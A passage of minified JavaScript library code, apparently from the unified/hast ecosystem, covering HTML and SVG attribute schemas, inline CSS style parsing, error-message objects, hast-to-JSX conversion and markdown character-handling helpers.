Validate:ta,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:ta,optimum:xe,pattern:null,ping:_a,placeholder:null,playsInline:ta,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:ta,referrerPolicy:null,rel:_a,required:ta,reversed:ta,rows:xe,rowSpan:xe,sandbox:_a,scope:null,scoped:ta,seamless:ta,selected:ta,shadowRootClonable:ta,shadowRootDelegatesFocus:ta,shadowRootMode:null,shape:null,size:xe,sizes:null,slot:null,span:xe,spellCheck:pt,src:null,srcDoc:null,srcLang:null,srcSet:null,start:xe,step:null,style:null,tabIndex:xe,target:null,title:null,translate:null,type:null,typeMustMatch:ta,useMap:null,value:pt,width:xe,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:_a,axis:null,background:null,bgColor:null,border:xe,borderColor:null,bottomMargin:xe,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:ta,declare:ta,event:null,face:null,frame:null,frameBorder:null,hSpace:xe,leftMargin:xe,link:null,longDesc:null,lowSrc:null,marginHeight:xe,marginWidth:xe,noResize:ta,noHref:ta,noShade:ta,noWrap:ta,object:null,profile:null,prompt:null,rev:null,rightMargin:xe,rules:null,scheme:null,scrolling:pt,standby:null,summary:null,text:null,topMargin:xe,valueType:null,version:null,vAlign:null,vLink:null,vSpace:xe,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:ta,disableRemotePlayback:ta,prefix:null,property:null,results:xe,security:null,unselectable:null},space:"html",transform:FD}),T7=$c({attributes:{accentHeight:"accent-height",alignmentBaseline:"alignment-baseline",arabicForm:"arabic-form",baselineShift:"baseline-shift",capHeight:"cap-height",className:"class",clipPath:"clip-path",clipRule:"clip-rule",colorInterpolation:"color-interpolation",colorInterpolationFilters:"color-interpolation-filters",colorProfile:"color-profile",colorRendering:"color-rendering",crossOrigin:"crossorigin",dataType:"datatype",dominantBaseline:"dominant-baseline",enableBackground:"enable-background",fillOpacity:"fill-opacity",fillRule:"fill-rule",floodColor:"flood-color",floodOpacity:"flood-opacity",fontFamily:"font-family",fontSize:"font-size",fontSizeAdjust:"font-size-adjust",fontStretch:"font-stretch",fontStyle:"font-style",fontVariant:"font-variant",fontWeight:"font-weight",glyphName:"glyph-name",glyphOrientationHorizontal:"glyph-orientation-horizontal",glyphOrientationVertical:"glyph-orientation-vertical",hrefLang:"hreflang",horizAdvX:"horiz-adv-x",horizOriginX:"horiz-origin-x",horizOriginY:"horiz-origin-y",imageRendering:"image-rendering",letterSpacing:"letter-spacing",lightingColor:"lighting-color",markerEnd:"marker-end",markerMid:"marker-mid",markerStart:"marker-start",navDown:"nav-down",navDownLeft:"nav-down-left",navDownRight:"nav-down-right",navLeft:"nav-left",navNext:"nav-next",navPrev:"nav-prev",navRight:"nav-right",navUp:"nav-up",navUpLeft:"nav-up-left",navUpRight:"nav-up-right",onAbort:"onabort",onActivate:"onactivate",onAfterPrint:"onafterprint",onBeforePrint:"onbeforeprint",onBegin:"onbegin",onCancel:"oncancel",onCanPlay:"oncanplay",onCanPlayThrough:"oncanplaythrough",onChange:"onchange",onClick:"onclick",onClose:"onclose",onCopy:"oncopy",onCueChange:"oncuechange",onCut:"oncut",onDblClick:"ondblclick",onDrag:"ondrag",onDragEnd:"ondragend",onDragEnter:"ondragenter",onDragExit:"ondragexit",onDragLeave:"ondragleave",onDragOver:"ondragover",onDragStart:"ondragstart",onDrop:"ondrop",onDurationChange:"ondurationchange",onEmptied:"onemptied",onEnd:"onend",onEnded:"onended",onError:"onerror",onFocus:"onfocus",onFocusIn:"onfocusin",onFocusOut:"onfocusout",onHashChange:"onhashchange",onInput:"oninput",onInvalid:"oninvalid",onKeyDown:"onkeydown",onKeyPress:"onkeypress",onKeyUp:"onkeyup",onLoad:"onload",onLoadedData:"onloadeddata",onLoadedMetadata:"onloadedmetadata",onLoadStart:"onloadstart",onMessage:"onmessage",onMouseDown:"onmousedown",onMouseEnter:"onmouseenter",onMouseLeave:"onmouseleave",onMouseMove:"onmousemove",onMouseOut:"onmouseout",onMouseOver:"onmouseover",onMouseUp:"onmouseup",onMouseWheel:"onmousewheel",onOffline:"onoffline",onOnline:"ononline",onPageHide:"onpagehide",onPageShow:"onpageshow",onPaste:"onpaste",onPause:"onpause",onPlay:"onplay",onPlaying:"onplaying",onPopState:"onpopstate",onProgress:"onprogress",onRateChange:"onratechange",onRepeat:"onrepeat",onReset:"onreset",onResize:"onresize",onScroll:"onscroll",onSeeked:"onseeked",onSeeking:"onseeking",onSelect:"onselect",onShow:"onshow",onStalled:"onstalled",onStorage:"onstorage",onSubmit:"onsubmit",onSuspend:"onsuspend",onTimeUpdate:"ontimeupdate",onToggle:"ontoggle",onUnload:"onunload",onVolumeChange:"onvolumechange",onWaiting:"onwaiting",onZoom:"onzoom",overlinePosition:"overline-position",overlineThickness:"overline-thickness",paintOrder:"paint-order",panose1:"panose-1",pointerEvents:"pointer-events",referrerPolicy:"referrerpolicy",renderingIntent:"rendering-intent",shapeRendering:"shape-rendering",stopColor:"stop-color",stopOpacity:"stop-opacity",strikethroughPosition:"strikethrough-position",strikethroughThickness:"strikethrough-thickness",strokeDashArray:"stroke-dasharray",strokeDashOffset:"stroke-dashoffset",strokeLineCap:"stroke-linecap",strokeLineJoin:"stroke-linejoin",strokeMiterLimit:"stroke-miterlimit",strokeOpacity:"stroke-opacity",strokeWidth:"stroke-width",tabIndex:"tabindex",textAnchor:"text-anchor",textDecoration:"text-decoration",textRendering:"text-rendering",transformOrigin:"transform-origin",typeOf:"typeof",underlinePosition:"underline-position",underlineThickness:"underline-thickness",unicodeBidi:"unicode-bidi",unicodeRange:"unicode-range",unitsPerEm:"units-per-em",vAlphabetic:"v-alphabetic",vHanging:"v-hanging",vIdeographic:"v-ideographic",vMathematical:"v-mathematical",vectorEffect:"vector-effect",vertAdvY:"vert-adv-y",vertOriginX:"vert-origin-x",vertOriginY:"vert-origin-y",wordSpacing:"word-spacing",writingMode:"writing-mode",xHeight:"x-height",playbackOrder:"playbackorder",timelineBegin:"timelinebegin"},properties:{about:In,accentHeight:xe,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:xe,amplitude:xe,arabicForm:null,ascent:xe,attributeName:null,attributeType:null,azimuth:xe,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:xe,by:null,calcMode:null,capHeight:xe,className:_a,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:xe,diffuseConstant:xe,direction:null,display:null,dur:null,divisor:xe,dominantBaseline:null,download:ta,dx:null,dy:null,edgeMode:null,editable:null,elevation:xe,enableBackground:null,end:null,event:null,exponent:xe,externalResourcesRequired:null,fill:null,fillOpacity:xe,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:Lc,g2:Lc,glyphName:Lc,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:xe,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:xe,horizOriginX:xe,horizOriginY:xe,id:null,ideographic:xe,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:xe,k:xe,k1:xe,k2:xe,k3:xe,k4:xe,kernelMatrix:In,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:xe,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:xe,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:xe,overlineThickness:xe,paintOrder:null,panose1:null,path:null,pathLength:xe,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:_a,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:xe,pointsAtY:xe,pointsAtZ:xe,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:In,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:In,rev:In,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:In,requiredFeatures:In,requiredFonts:In,requiredFormats:In,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:xe,specularExponent:xe,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:xe,strikethroughThickness:xe,string:null,stroke:null,strokeDashArray:In,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:xe,strokeOpacity:xe,strokeWidth:null,style:null,surfaceScale:xe,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:In,tabIndex:xe,tableValues:null,target:null,targetX:xe,targetY:xe,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:In,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:xe,underlineThickness:xe,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:xe,values:null,vAlphabetic:xe,vMathematical:xe,vectorEffect:null,vHanging:xe,vIdeographic:xe,version:null,vertAdvY:xe,vertOriginX:xe,vertOriginY:xe,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:xe,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:"svg",transform:BD}),VD=$c({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:"xlink",transform(a,e){return"xlink:"+e.slice(5).toLowerCase()}}),HD=$c({attributes:{xmlnsxlink:"xmlns:xlink"},properties:{xmlnsXLink:null,xmlns:null},space:"xmlns",transform:FD}),GD=$c({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:"xml",transform(a,e){return"xml:"+e.slice(3).toLowerCase()}}),x7={classId:"classID",dataType:"datatype",itemId:"itemID",strokeDashArray:"strokeDasharray",strokeDashOffset:"strokeDashoffset",strokeLineCap:"strokeLinecap",strokeLineJoin:"strokeLinejoin",strokeMiterLimit:"strokeMiterlimit",typeOf:"typeof",xLinkActuate:"xlinkActuate",xLinkArcRole:"xlinkArcrole",xLinkHref:"xlinkHref",xLinkRole:"xlinkRole",xLinkShow:"xlinkShow",xLinkTitle:"xlinkTitle",xLinkType:"xlinkType",xmlnsXLink:"xmlnsXlink"},A7=/[A-Z]/g,SP=/-[a-z]/g,P7=/^data[-\w.:]+$/i;function mg(a,e){const t=lp(e);let n=e,i=vn;if(t in a.normal)return a.property[a.normal[t]];if(t.length>4&&t.slice(0,4)==="data"&&P7.test(e)){if(e.charAt(4)==="-"){const r=e.slice(5).replace(SP,R7);n="data"+r.charAt(0).toUpperCase()+r.slice(1)}else{const r=e.slice(4);if(!SP.test(r)){let l=r.replace(A7,L7);l.charAt(0)!=="-"&&(l="-"+l),e="data"+l}}i=q1}return new i(n,e)}function L7(a){return"-"+a.toLowerCase()}function R7(a){return a.charAt(1).toUpperCase()}const Np=UD([zD,C7,VD,HD,GD],"html"),lr=UD([zD,T7,VD,HD,GD],"svg");function CP(a){const e=String(a||"").trim();return e?e.split(/[ \t\n\r\f]+/g):[]}function QD(a){return a.join(" ").trim()}var oc={},ny,TP;function I7(){if(TP)return ny;TP=1;var a=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,e=/\n/g,t=/^\s*/,n=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,i=/^:\s*/,r=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,l=/^[;\s]*/,u=/^\s+|\s+$/g,d=`
`,p="/",f="*",h="",E="comment",C="declaration";function A(R,I){if(typeof R!="string")throw new TypeError("First argument must be a string");if(!R)return[];I=I||{};var w=1,k=1;function Y(ce){var me=ce.match(e);me&&(w+=me.length);var Z=ce.lastIndexOf(d);k=~Z?ce.length-Z:k+ce.length}function ee(){var ce={line:w,column:k};return function(me){return me.position=new Q(ce),N(),me}}function Q(ce){this.start=ce,this.end={line:w,column:k},this.source=I.source}Q.prototype.content=R;function q(ce){var me=new Error(I.source+":"+w+":"+k+": "+ce);if(me.reason=ce,me.filename=I.source,me.line=w,me.column=k,me.source=R,!I.silent)throw me}function M(ce){var me=ce.exec(R);if(me){var Z=me[0];return Y(Z),R=R.slice(Z.length),me}}function N(){M(t)}function L(ce){var me;for(ce=ce||[];me=_();)me!==!1&&ce.push(me);return ce}function _(){var ce=ee();if(!(p!=R.charAt(0)||f!=R.charAt(1))){for(var me=2;h!=R.charAt(me)&&(f!=R.charAt(me)||p!=R.charAt(me+1));)++me;if(me+=2,h===R.charAt(me-1))return q("End of comment missing");var Z=R.slice(2,me-2);return k+=2,Y(Z),R=R.slice(me),k+=2,ce({type:E,comment:Z})}}function V(){var ce=ee(),me=M(n);if(me){if(_(),!M(i))return q("property missing ':'");var Z=M(r),re=ce({type:C,property:j(me[0].replace(a,h)),value:Z?j(Z[0].replace(a,h)):h});return M(l),re}}function F(){var ce=[];L(ce);for(var me;me=V();)me!==!1&&(ce.push(me),L(ce));return ce}return N(),F()}function j(R){return R?R.replace(u,h):h}return ny=A,ny}var xP;function w7(){if(xP)return oc;xP=1;var a=oc&&oc.__importDefault||function(n){return n&&n.__esModule?n:{default:n}};Object.defineProperty(oc,"__esModule",{value:!0}),oc.default=t;const e=a(I7());function t(n,i){let r=null;if(!n||typeof n!="string")return r;const l=(0,e.default)(n),u=typeof i=="function";return l.forEach(d=>{if(d.type!=="declaration")return;const{property:p,value:f}=d;u?i(p,f,d):f&&(r=r||{},r[p]=f)}),r}return oc}var cd={},AP;function j7(){if(AP)return cd;AP=1,Object.defineProperty(cd,"__esModule",{value:!0}),cd.camelCase=void 0;var a=/^--[a-zA-Z0-9_-]+$/,e=/-([a-z])/g,t=/^[^-]+$/,n=/^-(webkit|moz|ms|o|khtml)-/,i=/^-(ms)-/,r=function(p){return!p||t.test(p)||a.test(p)},l=function(p,f){return f.toUpperCase()},u=function(p,f){return"".concat(f,"-")},d=function(p,f){return f===void 0&&(f={}),r(p)?p:(p=p.toLowerCase(),f.reactCompat?p=p.replace(i,u):p=p.replace(n,u),p.replace(e,l))};return cd.camelCase=d,cd}var ud,PP;function D7(){if(PP)return ud;PP=1;var a=ud&&ud.__importDefault||function(i){return i&&i.__esModule?i:{default:i}},e=a(w7()),t=j7();function n(i,r){var l={};return!i||typeof i!="string"||(0,e.default)(i,function(u,d){u&&d&&(l[(0,t.camelCase)(u,r)]=d)}),l}return n.default=n,ud=n,ud}var M7=D7();const N7=pE(M7),fg=JD("end"),uo=JD("start");function JD(a){return e;function e(t){const n=t&&t.position&&t.position[a]||{};if(typeof n.line=="number"&&n.line>0&&typeof n.column=="number"&&n.column>0)return{line:n.line,column:n.column,offset:typeof n.offset=="number"&&n.offset>-1?n.offset:void 0}}}function _7(a){const e=uo(a),t=fg(a);if(e&&t)return{start:e,end:t}}function qd(a){return!a||typeof a!="object"?"":"position"in a||"type"in a?LP(a.position):"start"in a||"end"in a?LP(a):"line"in a||"column"in a?A0(a):""}function A0(a){return RP(a&&a.line)+":"+RP(a&&a.column)}function LP(a){return A0(a&&a.start)+"-"+A0(a&&a.end)}function RP(a){return a&&typeof a=="number"?a:1}class Jt extends Error{constructor(e,t,n){super(),typeof t=="string"&&(n=t,t=void 0);let i="",r={},l=!1;if(t&&("line"in t&&"column"in t?r={place:t}:"start"in t&&"end"in t?r={place:t}:"type"in t?r={ancestors:[t],place:t.position}:r={...t}),typeof e=="string"?i=e:!r.cause&&e&&(l=!0,i=e.message,r.cause=e),!r.ruleId&&!r.source&&typeof n=="string"){const d=n.indexOf(":");d===-1?r.ruleId=n:(r.source=n.slice(0,d),r.ruleId=n.slice(d+1))}if(!r.place&&r.ancestors&&r.ancestors){const d=r.ancestors[r.ancestors.length-1];d&&(r.place=d.position)}const u=r.place&&"start"in r.place?r.place.start:r.place;this.ancestors=r.ancestors||void 0,this.cause=r.cause||void 0,this.column=u?u.column:void 0,this.fatal=void 0,this.file="",this.message=i,this.line=u?u.line:void 0,this.name=qd(r.place)||"1:1",this.place=r.place||void 0,this.reason=this.message,this.ruleId=r.ruleId||void 0,this.source=r.source||void 0,this.stack=l&&r.cause&&typeof r.cause.stack=="string"?r.cause.stack:"",this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}}Jt.prototype.file="";Jt.prototype.name="";Jt.prototype.reason="";Jt.prototype.message="";Jt.prototype.stack="";Jt.prototype.column=void 0;Jt.prototype.line=void 0;Jt.prototype.ancestors=void 0;Jt.prototype.cause=void 0;Jt.prototype.fatal=void 0;Jt.prototype.place=void 0;Jt.prototype.ruleId=void 0;Jt.prototype.source=void 0;const k1={}.hasOwnProperty,q7=new Map,k7=/[A-Z]/g,O7=new Set(["table","tbody","thead","tfoot","tr"]),U7=new Set(["td","th"]),WD="https://github.com/syntax-tree/hast-util-to-jsx-runtime";function z7(a,e){if(!e||e.Fragment===void 0)throw new TypeError("Expected `Fragment` in options");const t=e.filePath||void 0;let n;if(e.development){if(typeof e.jsxDEV!="function")throw new TypeError("Expected `jsxDEV` in options when `development: true`");n=W7(t,e.jsxDEV)}else{if(typeof e.jsx!="function")throw new TypeError("Expected `jsx` in production options");if(typeof e.jsxs!="function")throw new TypeError("Expected `jsxs` in production options");n=J7(t,e.jsx,e.jsxs)}const i={Fragment:e.Fragment,ancestors:[],components:e.components||{},create:n,elementAttributeNameCase:e.elementAttributeNameCase||"react",evaluater:e.createEvaluater?e.createEvaluater():void 0,filePath:t,ignoreInvalidStyle:e.ignoreInvalidStyle||!1,passKeys:e.passKeys!==!1,passNode:e.passNode||!1,schema:e.space==="svg"?lr:Np,stylePropertyNameCase:e.stylePropertyNameCase||"dom",tableCellAlignToStyle:e.tableCellAlignToStyle!==!1},r=KD(i,a,void 0);return r&&typeof r!="string"?r:i.create(a,i.Fragment,{children:r||void 0},void 0)}function KD(a,e,t){if(e.type==="element")return B7(a,e,t);if(e.type==="mdxFlowExpression"||e.type==="mdxTextExpression")return F7(a,e);if(e.type==="mdxJsxFlowElement"||e.type==="mdxJsxTextElement")return H7(a,e,t);if(e.type==="mdxjsEsm")return V7(a,e);if(e.type==="root")return G7(a,e,t);if(e.type==="text")return Q7(a,e)}function B7(a,e,t){const n=a.schema;let i=n;e.tagName.toLowerCase()==="svg"&&n.space==="html"&&(i=lr,a.schema=i),a.ancestors.push(e);const r=$D(a,e.tagName,!1),l=K7(a,e);let u=U1(a,e);return O7.has(e.tagName)&&(u=u.filter(function(d){return typeof d=="string"?!E7(d):!0})),YD(a,l,r,e),O1(l,u),a.ancestors.pop(),a.schema=n,a.create(e,r,l,t)}function F7(a,e){if(e.data&&e.data.estree&&a.evaluater){const n=e.data.estree.body[0];return n.type,a.evaluater.evaluateExpression(n.expression)}cp(a,e.position)}function V7(a,e){if(e.data&&e.data.estree&&a.evaluater)return a.evaluater.evaluateProgram(e.data.estree);cp(a,e.position)}function H7(a,e,t){const n=a.schema;let i=n;e.name==="svg"&&n.space==="html"&&(i=lr,a.schema=i),a.ancestors.push(e);const r=e.name===null?a.Fragment:$D(a,e.name,!0),l=Y7(a,e),u=U1(a,e);return YD(a,l,r,e),O1(l,u),a.ancestors.pop(),a.schema=n,a.create(e,r,l,t)}function G7(a,e,t){const n={};return O1(n,U1(a,e)),a.create(e,a.Fragment,n,t)}function Q7(a,e){return e.value}function YD(a,e,t,n){typeof t!="string"&&t!==a.Fragment&&a.passNode&&(e.node=n)}function O1(a,e){if(e.length>0){const t=e.length>1?e:e[0];t&&(a.children=t)}}function J7(a,e,t){return n;function n(i,r,l,u){const p=Array.isArray(l.children)?t:e;return u?p(r,l,u):p(r,l)}}function W7(a,e){return t;function t(n,i,r,l){const u=Array.isArray(r.children),d=uo(n);return e(i,r,l,u,{columnNumber:d?d.column-1:void 0,fileName:a,lineNumber:d?d.line:void 0},void 0)}}function K7(a,e){const t={};let n,i;for(i in e.properties)if(i!=="children"&&k1.call(e.properties,i)){const r=$7(a,i,e.properties[i]);if(r){const[l,u]=r;a.tableCellAlignToStyle&&l==="align"&&typeof u=="string"&&U7.has(e.tagName)?n=u:t[l]=u}}if(n){const r=t.style||(t.style={});r[a.stylePropertyNameCase==="css"?"text-align":"textAlign"]=n}return t}function Y7(a,e){const t={};for(const n of e.attributes)if(n.type==="mdxJsxExpressionAttribute")if(n.data&&n.data.estree&&a.evaluater){const r=n.data.estree.body[0];r.type;const l=r.expression;l.type;const u=l.properties[0];u.type,Object.assign(t,a.evaluater.evaluateExpression(u.argument))}else cp(a,e.position);else{const i=n.name;let r;if(n.value&&typeof n.value=="object")if(n.value.data&&n.value.data.estree&&a.evaluater){const u=n.value.data.estree.body[0];u.type,r=a.evaluater.evaluateExpression(u.expression)}else cp(a,e.position);else r=n.value===null?!0:n.value;t[i]=r}return t}function U1(a,e){const t=[];let n=-1;const i=a.passKeys?new Map:q7;for(;++n<e.children.length;){const r=e.children[n];let l;if(a.passKeys){const d=r.type==="element"?r.tagName:r.type==="mdxJsxFlowElement"||r.type==="mdxJsxTextElement"?r.name:void 0;if(d){const p=i.get(d)||0;l=d+"-"+p,i.set(d,p+1)}}const u=KD(a,r,l);u!==void 0&&t.push(u)}return t}function $7(a,e,t){const n=mg(a.schema,e);if(!(t==null||typeof t=="number"&&Number.isNaN(t))){if(Array.isArray(t)&&(t=n.commaSeparated?OD(t):QD(t)),n.property==="style"){let i=typeof t=="object"?t:X7(a,String(t));return a.stylePropertyNameCase==="css"&&(i=Z7(i)),["style",i]}return[a.elementAttributeNameCase==="react"&&n.space?x7[n.property]||n.property:n.attribute,t]}}function X7(a,e){try{return N7(e,{reactCompat:!0})}catch(t){if(a.ignoreInvalidStyle)return{};const n=t,i=new Jt("Cannot parse `style` attribute",{ancestors:a.ancestors,cause:n,ruleId:"style",source:"hast-util-to-jsx-runtime"});throw i.file=a.filePath||void 0,i.url=WD+"#cannot-parse-style-attribute",i}}function $D(a,e,t){let n;if(!t)n={type:"Literal",value:e};else if(e.includes(".")){const i=e.split(".");let r=-1,l;for(;++r<i.length;){const u=vP(i[r])?{type:"Identifier",name:i[r]}:{type:"Literal",value:i[r]};l=l?{type:"MemberExpression",object:l,property:u,computed:!!(r&&u.type==="Literal"),optional:!1}:u}n=l}else n=vP(e)&&!/^[a-z]/.test(e)?{type:"Identifier",name:e}:{type:"Literal",value:e};if(n.type==="Literal"){const i=n.value;return k1.call(a.components,i)?a.components[i]:i}if(a.evaluater)return a.evaluater.evaluateExpression(n);cp(a)}function cp(a,e){const t=new Jt("Cannot handle MDX estrees without `createEvaluater`",{ancestors:a.ancestors,place:e,ruleId:"mdx-estree",source:"hast-util-to-jsx-runtime"});throw t.file=a.filePath||void 0,t.url=WD+"#cannot-handle-mdx-estrees-without-createevaluater",t}function Z7(a){const e={};let t;for(t in a)k1.call(a,t)&&(e[eG(t)]=a[t]);return e}function eG(a){let e=a.replace(k7,aG);return e.slice(0,3)==="ms-"&&(e="-"+e),e}function aG(a){return"-"+a.toLowerCase()}const iy={action:["form"],cite:["blockquote","del","ins","q"],data:["object"],formAction:["button","input"],href:["a","area","base","link"],icon:["menuitem"],itemId:null,manifest:["html"],ping:["a","area"],poster:["video"],src:["audio","embed","iframe","img","input","script","source","track","video"]},tG={};function z1(a,e){const t=tG,n=typeof t.includeImageAlt=="boolean"?t.includeImageAlt:!0,i=typeof t.includeHtml=="boolean"?t.includeHtml:!0;return XD(a,n,i)}function XD(a,e,t){if(nG(a)){if("value"in a)return a.type==="html"&&!t?"":a.value;if(e&&"alt"in a&&a.alt)return a.alt;if("children"in a)return IP(a.children,e,t)}return Array.isArray(a)?IP(a,e,t):""}function IP(a,e,t){const n=[];let i=-1;for(;++i<a.length;)n[i]=XD(a[i],e,t);return n.join("")}function nG(a){return!!(a&&typeof a=="object")}const wP=document.createElement("i");function B1(a){const e="&"+a+";";wP.innerHTML=e;const t=wP.textContent;return t.charCodeAt(t.length-1)===59&&a!=="semi"||t===e?!1:t}function Dn(a,e,t,n){const i=a.length;let r=0,l;if(e<0?e=-e>i?0:i+e:e=e>i?i:e,t=t>0?t:0,n.length<1e4)l=Array.from(n),l.unshift(e,t),a.splice(...l);else for(t&&a.splice(e,t);r<n.length;)l=n.slice(r,r+1e4),l.unshift(e,0),a.splice(...l),r+=1e4,e+=1e4}function Wn(a,e){return a.length>0?(Dn(a,a.length,0,e),a):e}const jP={}.hasOwnProperty;function ZD(a){const e={};let t=-1;for(;++t<a.length;)iG(e,a[t]);return e}function iG(a,e){let t;for(t in e){const i=(jP.call(a,t)?a[t]:void 0)||(a[t]={}),r=e[t];let l;if(r)for(l in r){jP.call(i,l)||(i[l]=[]);const u=r[l];oG(i[l],Array.isArray(u)?u:u?[u]:[])}}}function oG(a,e){let t=-1;const n=[];for(;++t<e.length;)(e[t].add==="after"?a:n).push(e[t]);Dn(a,0,0,n)}function eM(a,e){const t=Number.parseInt(a,e);return t<9||t===11||t>13&&t<32||t>126&&t<160||t>55295&&t<57344||t>64975&&t<65008||(t&65535)===65535||(t&65535)===65534||t>1114111?"":String.fromCodePoint(t)}function Ci(a){return a.replace(/[\t\n\r ]+/g," ").replace(/^ | $/g,"").toLowerCase().toUpperCase()}const Xt=cr(/[A-Za-z]/),Gt=cr(/[\dA-Za-z]/),sG=cr(/[#-'*+\--9=?A-Z^-~]/);function wh(a){return a!==null&&(a<32||a===127)}const P0=cr(/\d/),rG=cr(/[\dA-Fa-f]/),lG=cr(/[!-/:-@[-`{-~]/);function ze(a){return a!==null&&a<-2}function Na(a){return a!==null&&(a<0||a===32)}function sa(a){return a===-2||a===-1||a===32}const hg=cr(new RegExp("\\p{P}|\\p{S}","u")),ul=cr(/\s/);function cr(a){return e;function e(t){return t!==null&&t>-1&&a.test(String.fromCharCode(t))}}function Xc(a){const e=[];let t=-1,n=0,i=0;for(;++t<a.length;){const r=a.charCodeAt(t);let 